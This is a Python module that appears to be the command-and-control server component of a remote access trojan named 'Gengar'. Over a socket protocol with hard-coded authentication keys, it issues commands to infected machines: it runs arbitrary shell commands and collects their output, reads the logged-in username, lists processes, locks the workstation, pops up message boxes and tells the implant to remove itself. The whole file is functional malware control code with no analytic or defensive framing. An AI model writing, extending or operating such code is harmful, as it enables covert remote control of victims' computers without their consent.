import datetime
import socket
import struct
from dataclasses import dataclass
from logging import log
from typing import final

from logger import logger


class CommandTypes:
    ECHO = 0
    SHELL = 1
    MSGBOX = 2
    SUICIDE = 3


INT_SIZE = 4


class GengarAuthenticationFailed(Exception):
    def __str__(self) -> str:
        return 'Failed to authenticate Gengar with the CNC.'


class GengarDisconnected(Exception):
    def __str__(self) -> str:
        return 'Gengar has disconnected from the CNC.'


@dataclass
class ShellOutput:
    exit_code: int
    output: str


AUTH_KEY_FROM_GENGAR = b'4be166c8-5aa2-4db2-90a1-446aacd14d32'
AUTH_KEY_TO_GENGAR = b'b6c077c1-12d1-4dbb-8786-d22a7090bfae'


@dataclass
class Gengar:
    _sock: socket.socket
    host: str
    _authenticated: bool = False
    alive: bool = True

    def init(self):
        self.spawn_time = datetime.datetime.now()
        self.username = self.shell('echo %username%').output

    def _send(self, buf: bytes):
        if not self.alive:
            raise GengarDisconnected

        try:
            self._sock.sendall(buf)
        except ConnectionError:
            self.alive = False
            raise GengarDisconnected from None

    def _recv(self, bufsize: int):
        if not self.alive:
            raise GengarDisconnected

        try:
            return self._sock.recv(bufsize)
        except ConnectionError:
            self.alive = False
            raise GengarDisconnected from None

    def _recvall(self, bufsize: int):
        data = b''
        bytes_remaining = bufsize
        while bytes_remaining:
            data_chunk = self._recv(bytes_remaining)
            data += data_chunk
            bytes_remaining -= len(data_chunk)
        return data

    def echo(self, text: str):
        self._send(struct.pack('I', CommandTypes.ECHO) + struct.pack('I', len(text)) + text.encode())
        output = self._recvall(len(text)).decode()
        return output

    def shell(self, cmd: str):
        output = b''
        self._send(struct.pack('I', CommandTypes.SHELL) + struct.pack('I', len(cmd)) + cmd.encode())
        while True:
            output_size = struct.unpack('I', self._recv(INT_SIZE))[0]
            if not output_size:
                exit_code = struct.unpack('i', self._recv(INT_SIZE))[0]
                break
            output += self._recv(output_size)

        try:
            return ShellOutput(exit_code, output.decode().strip())
        except UnicodeDecodeError:
            return ShellOutput(exit_code, output)

    def msgbox(self, title: str, text: str):
        self._send(struct.pack('I', CommandTypes.MSGBOX) + struct.pack('I', len(title)) +
                   title.encode() + struct.pack('I', len(text)) + text.encode())

    def suicide(self):
        self._send(struct.pack('I', CommandTypes.SUICIDE))
        self._sock.close()
        self.alive = False

    def lock_workstation(self):
        self.shell('rundll32.exe user32.dll,LockWorkStation')

    def process_list(self):
        return self.shell('tasklist').output

    def auth(self):
        if self._authenticated:
            logger.info('Gengar already authenticated.')
            return

        try:
            self._sock.settimeout(5)
            received_auth_key = self._recv(len(AUTH_KEY_FROM_GENGAR))
            if received_auth_key != AUTH_KEY_FROM_GENGAR:
                raise GengarAuthenticationFailed
            self._send(AUTH_KEY_TO_GENGAR)
            self._authenticated = True
        except socket.timeout:
            raise GengarAuthenticationFailed
        finally:
            self._sock.settimeout(None)

    @property
    def uptime(self):
        return datetime.datetime.now() - self.spawn_time

    def __repr__(self) -> str:
        return f'Gengar @ {self.username} # {self.uptime}'
